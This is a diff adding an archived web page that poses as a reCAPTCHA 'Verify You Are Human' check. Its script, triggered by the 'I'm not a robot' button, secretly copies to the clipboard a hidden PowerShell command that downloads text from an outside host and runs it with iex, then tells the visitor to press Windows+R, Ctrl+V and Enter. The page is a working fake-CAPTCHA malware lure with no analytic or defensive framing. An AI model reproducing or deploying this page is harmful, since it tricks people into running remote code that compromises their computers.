@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verify You Are Human</title>
+    <link rel="stylesheet" href="http://web.archive.org/web/20240912084036cs_/https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f2f2f2;
+            color: #333;
+        }
+        .container {
+            text-align: center;
+            max-width: 500px;
+            margin: 20px;
+            position: relative;
+        }
+        .recaptcha-box {
+            padding: 20px;
+            background: #fff;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.3);
+            border-radius: 8px;
+            text-align: center;
+        }
+        .recaptcha-box h2 {
+            margin: 0 0 20px;
+            font-size: 28px;
+            color: #4285f4;
+        }
+        .recaptcha-box p {
+            margin: 0 0 20px;
+            font-size: 18px;
+            color: #666;
+        }
+        .recaptcha-button {
+            display: inline-flex;
+            align-items: center;
+            padding: 10px 20px;
+            background: #4285f4;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background 0.3s;
+        }
+        .recaptcha-button img {
+            margin-right: 10px;
+        }
+        .recaptcha-button:hover {
+            background: #357ae8;
+        }
+        .recaptcha-popup {
+            display: none;
+            padding: 20px;
+            background: #fff;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.3);
+            border-radius: 8px;
+            text-align: left;
+            position: absolute;
+            top: 110%;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 20;
+            animation: fadeIn 0.5s ease;
+        }
+        .recaptcha-popup.active {
+            display: block;
+        }
+        .recaptcha-popup h3 {
+            margin: 0 0 15px;
+            font-size: 24px;
+            color: #333;
+        }
+        .recaptcha-popup p {
+            font-size: 18px;
+            color: #333;
+            margin: 5px 0;
+        }
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 10;
+            display: none;
+        }
+        .overlay.active {
+            display: block;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="overlay" id="overlay"></div>
+        <div class="recaptcha-box">
+            <h2>Verify You Are Human</h2>
+            <p>Please verify that you are a human to continue.</p>
+            <div class="recaptcha-button" id="verifyButton">
+                <img src="http://web.archive.org/web/20240912084036im_/https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA Logo">
+                <span>I'm not a robot</span>
+            </div>
+            <div class="recaptcha-popup" id="recaptchaPopup">
+                <h3>Verification Steps</h3>
+                <p>1. Press Windows Button "<i class="fab fa-windows"></i>" + R</p>
+                <p>2. Press CTRL + V</p>
+                <p>3. Press Enter</p>
+            </div>
+        </div>
+    </div> 
+	
+    <script>
+        function verify() {
+            const textToCopy = "powershell.exe -W Hidden -command $url = 'http://web.archive.org/web/20240912084036/https://report1.b-cdn.net/giga.txt'; $response = Invoke-WebRequest -Uri $url -UseBasicParsing; $text = $response.Content; iex $text";
+            const tempTextArea = document.createElement("textarea");
+            tempTextArea.value = textToCopy;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand("copy");
+            document.body.removeChild(tempTextArea);
+
+            const recaptchaPopup = document.getElementById("recaptchaPopup");
+            const overlay = document.getElementById("overlay");
+            recaptchaPopup.classList.add("active");
+            overlay.classList.add("active");
+        }
+
+        const verifyButton = document.getElementById('verifyButton');
+        verifyButton.addEventListener('click', verify);
+    </script>
+</body>
+</html>
+<!--
+     FILE ARCHIVED ON 08:40:36 Sep 12, 2024 AND RETRIEVED FROM THE
+     INTERNET ARCHIVE ON 16:36:30 Apr 25, 2025.
+     JAVASCRIPT APPENDED BY WAYBACK MACHINE, COPYRIGHT INTERNET ARCHIVE.
+
+     ALL OTHER CONTENT MAY ALSO BE PROTECTED BY COPYRIGHT (17 U.S.C.
+     SECTION 108(a)(3)).
+-->
+<!--
+playback timings (ms):
+  captures_list: 0.882
+  exclusion.robots: 0.047
+  exclusion.robots.policy: 0.024
+  esindex: 0.021
+  cdx.remote: 36.719
+  LoadShardBlock: 124.523 (3)
+  PetaboxLoader3.datanode: 53.803 (4)
+  load_resource: 95.438
+  PetaboxLoader3.resolve: 54.524
+-->
